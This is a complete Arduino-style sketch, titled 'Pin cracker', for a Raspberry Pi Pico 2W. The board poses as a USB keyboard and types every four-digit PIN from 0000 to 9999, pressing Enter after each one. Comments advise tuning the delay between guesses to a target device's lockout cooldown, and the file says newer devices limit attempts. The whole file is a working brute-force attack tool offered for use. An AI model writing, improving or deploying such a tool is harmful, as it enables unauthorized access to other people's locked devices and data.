//================================================================================================================
// Pin cracker.
// target: raspberry pi pico 2w
// NOTICE: this wont work on new devices because they limit the amount of "tries" you can input.
// total combinations: 10,000
//================================================================================================================

#include "Keyboard.h"

// hardware config
const int SAFTEY_PIN = 2;  // make sure you connect GPIO pin 2 to gnd pin 
int currentCombination = 0; // starts at 0000

void setup() {
  // initialize the usb hid keyboard emulator
  Keyboard.begin();

  // enable internal pull up resistor on saftey pin
  pinMode(SAFTEY_PIN, INPUT_PULLUP);

  //Initial saftey delay
  delay(5000);
}

void loop() {
  // SAFTEY CHECK: If GPIO 2 in not connected to GND, pause execution.
  // this allows you to safley edit the code if needed
  if (digitalRead(SAFTEY_PIN) == HIGH) {
    delay(500);
    return;
  }
  // Stop running after testing all 10,000 combinations
  if (currentCombination > 9999) {
    while (true) {
      delay(1000); // stop state
    }
  }

  //Generate the 4 digit pin string with leading zeros
  char pinString[5]; // 4 digits + null terminator
  sprintf(pinString, "%04d", currentCombination);

  // type out each digit sequentially
  for (int i = 0; i < 4; i++) {
    Keyboard.print(pinString[i]);
    delay(50); // small delay between keypresses for stability
  }

  // Submit the pin by pressing Enter
  Keyboard.press(KEY_RETURN);
  delay(50);
  Keyboard.release(KEY_RETURN);

  // Speed control delay (2000 ms = approx. 2.2 seconds per total guess)
  // NOTICE: lower/extend this number depending on device.
  // Lower if it accepts rapid inputs, Increase if device enforces a strict cooling-off period
  delay(2000);

  //Move to the next combination
  currentCombination++;
}

